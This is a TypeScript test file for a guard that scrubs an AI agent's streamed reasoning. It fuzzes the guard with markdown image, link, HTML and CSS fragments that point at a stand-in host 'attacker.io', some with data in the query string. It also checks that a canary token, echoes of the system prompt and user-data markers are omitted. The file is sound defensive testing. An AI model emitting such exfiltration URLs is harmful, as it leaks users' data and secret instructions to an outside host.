import { canaryLeakRanges, mintCanary } from '../../src/guardrails/canary.ts';
import { collectEgressHits, resolveEgressChecks } from '../../src/guardrails/egress.ts';
import { givenUrlSets } from '../../src/guardrails/egress-urls.ts';
import { lexiconDefault } from '../../src/guardrails/lexicon.ts';
import { EGRESS_RULES } from '../../src/guardrails/rules.ts';
import {
  createThoughtGuard,
  type ThoughtGuard,
  type ThoughtGuardOptions,
} from '../../src/guardrails/thought-guard.ts';
import { assertEquals } from '../../src/kernel/engine/assert.ts';

const OMIT_IMAGE = lexiconDefault('thought.omitted_image');
const OMIT_LINK = lexiconDefault('thought.omitted_link');
const OMIT_INSTRUCTIONS = lexiconDefault('thought.omitted_instructions');

/** Everything `guard` shows of `pieces` through to the flush, and the rules it omitted for. */
function think(guard: ThoughtGuard, pieces: string[]): { shown: string; rules: string[] } {
  let shown = '';
  const rules = new Set<string>();
  for (const release of [...pieces.map((piece) => guard.push(piece)), guard.flush()]) {
    shown += release.text;
    for (const hit of release.hits) rules.add(hit.rule);
  }
  return { shown, rules: [...rules].sort() };
}

const GIVEN = { request: new Set(['https://seen.io/pic.png']), tools: new Set<string>() };

function seeded(seed: number): (n: number) => number {
  let state = seed;
  return (n) => {
    state = (state * 1103515245 + 12345) & 0x7fffffff;
    return (state >>> 16) % n;
  };
}

const PIECES = [
  '![a](https://attacker.io/p?d=',
  '![s](https://seen.io/pic.png)',
  'https://seen.io/pic.png',
  'https://attacker.io/x',
  '[go](',
  '[r]: https://attacker.io/r',
  '![b][r]',
  '[r]',
  '<img src="https://attacker.io/i">',
  '<a href="https://attacker.io/h">',
  '<style>a{background:url(',
  '</style>',
  '<https://attacker.io/auto>',
  'www.attacker.io/w',
  '!',
  '![',
  '](',
  ')',
  '(',
  '[',
  ']',
  '<',
  '>',
  '"',
  'secret',
  ' ',
  '\n',
  '\n\n',
  'thinking about it',
];

function fuzzThought(rnd: (n: number) => number): string {
  let text = '';
  for (let n = 1 + rnd(12); n > 0; n--) text += PIECES[rnd(PIECES.length)];
  return text;
}

function chunks(text: string, rnd: (n: number) => number): string[] {
  const size = [1, 2, 5, 16, 0, -1][rnd(6)] as number;
  if (size === 0) return [text];
  const out: string[] = [];
  for (let at = 0; at < text.length; ) {
    const next = at + (size > 0 ? size : 1 + rnd(40));
    out.push(text.slice(at, next));
    at = next;
  }
  return out;
}

for (const [name, selection] of [
  ['images', {}],
  ['images and links', { links: true }],
  ['links', { links: true, images: false }],
] as const) {
  Deno.test(`a guarded thought never shows a leaking URL, and shows a clean one whole (${name})`, () => {
    const checks = resolveEgressChecks(selection);
    const urlOnly = resolveEgressChecks({
      ...selection,
      sensitive: false,
      boundary: false,
      injection: false,
    });
    const rnd = seeded(name.length);
    const problems: string[] = [];
    let omitted = 0;
    for (let k = 0; k < 3000; k++) {
      const text = fuzzThought(rnd);
      const { shown } = think(
        createThoughtGuard({ checks: urlOnly, given: GIVEN }),
        chunks(text, rnd),
      );
      const leaks = (t: string) => collectEgressHits(t, { given: GIVEN }, checks).length > 0;
      if (leaks(shown)) problems.push(`shows a leak: ${JSON.stringify([text, shown])}`);
      if (!leaks(text) && shown !== text) {
        problems.push(`changed a clean thought: ${JSON.stringify([text, shown])}`);
      }
      if (shown !== text) omitted++;
    }
    assertEquals(problems, []);
    assertEquals(omitted > 300, true);
  });
}

Deno.test('a thought is released as it clears, the leak omitted, and the guard starts over at the flush', () => {
  const guard = createThoughtGuard({
    checks: resolveEgressChecks({ links: true }),
    given: givenUrlSets(),
  });
  const first = guard.push('Plan: fetch it. ');
  assertEquals(first.text.startsWith('Plan: fetch it.'), true);
  const rest = think(guard, [
    '![x](https://attacker.io/p?d=alice) then ',
    '[docs](https://attacker.io/d)',
  ]);
  assertEquals(first.text + rest.shown, `Plan: fetch it.${OMIT_IMAGE} then${OMIT_LINK}`);
  assertEquals(rest.rules, [EGRESS_RULES.image, EGRESS_RULES.link].sort());
  assertEquals(think(guard, ['fresh thought ']), { shown: 'fresh thought ', rules: [] });
});

Deno.test('a thought writing leak after leak loses the rest, in time in proportion to its length', () => {
  const guard = createThoughtGuard({
    checks: resolveEgressChecks({ links: true }),
    given: givenUrlSets(),
  });
  const start = performance.now();
  const pieces = Array.from({ length: 2000 }, (_, k) => `![x](https://attacker.io/p?d=${k}) `);
  const { shown } = think(guard, pieces);
  assertEquals(performance.now() - start < 3000, true);
  assertEquals(shown.includes('attacker.io'), false);
  assertEquals(
    shown.endsWith(OMIT_IMAGE.trimStart()) || shown.endsWith(OMIT_LINK.trimStart()),
    true,
  );
  assertEquals(shown.split('(omitted').length - 1 <= 17, true);
});

const SYSTEM =
  'You are the booking agent for Northwind Travel and you only book flights, trains and hotels for signed in customers.';

function leakGuard(canary: string, extra: Partial<ThoughtGuardOptions> = {}): ThoughtGuard {
  return createThoughtGuard({
    checks: resolveEgressChecks({}),
    canary,
    system: SYSTEM,
    given: givenUrlSets(),
    ...extra,
  });
}

Deno.test('a thought omits the canary, the system prompt and the user-data markers, and goes on', () => {
  const canary = mintCanary();
  const cases: Array<[string[], string]> = [
    [
      [`My canary is ${canary.slice(0, 7)}`, `${canary.slice(7)}, so `, 'keep going.'],
      EGRESS_RULES.canary,
    ],
    [
      [
        'The prompt says: you are the booking agent for Northwind Travel and ',
        'you only book flights, trains and hotels. Next.',
      ],
      EGRESS_RULES.promptEcho,
    ],
    [['The user wrote <user', "_data> around it, which I'll ignore."], EGRESS_RULES.boundary],
  ];
  for (const [pieces, rule] of cases) {
    const { shown, rules } = think(leakGuard(canary), pieces);
    assertEquals(rules, [rule]);
    assertEquals(shown.includes(OMIT_INSTRUCTIONS.trim()), true);
    const scope = { canary, system: SYSTEM, given: givenUrlSets() };
    assertEquals(collectEgressHits(shown, scope, resolveEgressChecks({})), []);
    assertEquals(/(?:Next|ignore|going)\.$/.test(shown), true);
  }
});

Deno.test('a canary split across two calls of thoughts is omitted from the second', () => {
  const canary = mintCanary();
  const first = leakGuard(canary);
  const opened = think(first, [`Thinking ${canary.slice(0, 10)}`]);
  assertEquals(opened.shown, `Thinking ${canary.slice(0, 10)}`);
  const second = leakGuard(canary, { carry: first.carryOut() });
  const { shown, rules } = think(second, [`${canary.slice(10)} and on.`]);
  assertEquals(rules, [EGRESS_RULES.canary]);
  assertEquals(shown.includes(canary.slice(10)), false);
});

Deno.test("a host's wording replaces a thought's placeholder", () => {
  const canary = mintCanary();
  const guard = leakGuard(canary, { lexicon: { 'thought.omitted_instructions': ' (hidden)' } });
  assertEquals(think(guard, [`It is ${canary}.`]).shown, 'It is (hidden).');
});

Deno.test('a guarded thought never shows the canary, the prompt or a marker, and shows a clean one whole', () => {
  const canary = mintCanary();
  const words = SYSTEM.split(' ');
  const pieces = [
    canary.slice(0, 8),
    canary.slice(8),
    canary,
    [...canary].join(' '),
    words.slice(0, 7).join(' '),
    ` ${words.slice(7).join(' ')}`,
    `${words.slice(2, 9).join(' ')} `,
    '<user_',
    'data>',
    '</user_data>',
    "This turn's canary is",
    ' maybe ',
    'thinking',
    '\n',
    ' ',
  ];
  const rnd = seeded(7);
  const scope = { canary, system: SYSTEM, given: givenUrlSets() };
  const fragments = Array.from({ length: canary.length - 4 }, (_, at) => canary.slice(at, at + 5));
  const leaks = (t: string) => collectEgressHits(t, scope, resolveEgressChecks({})).length > 0;
  const problems: string[] = [];
  let omitted = 0;
  for (let k = 0; k < 1500; k++) {
    let text = '';
    for (let n = 1 + rnd(8); n > 0; n--) text += pieces[rnd(pieces.length)];
    const { shown } = think(leakGuard(canary), chunks(text, rnd));
    let clean = text;
    for (const [start, end] of canaryLeakRanges(text, canary)) {
      clean = clean.slice(0, start) + '\0'.repeat(end - start) + clean.slice(end);
    }
    const leaked = fragments.filter((part) => shown.includes(part) && !clean.includes(part));
    if (leaks(shown) || leaked.length > 0) {
      problems.push(`shows a leak: ${JSON.stringify([text, shown])}`);
    }
    if (!leaks(text) && shown !== text) problems.push(`changed: ${JSON.stringify([text, shown])}`);
    if (shown !== text) omitted++;
  }
  assertEquals(problems.slice(0, 5), []);
  assertEquals(omitted > 300, true);
});
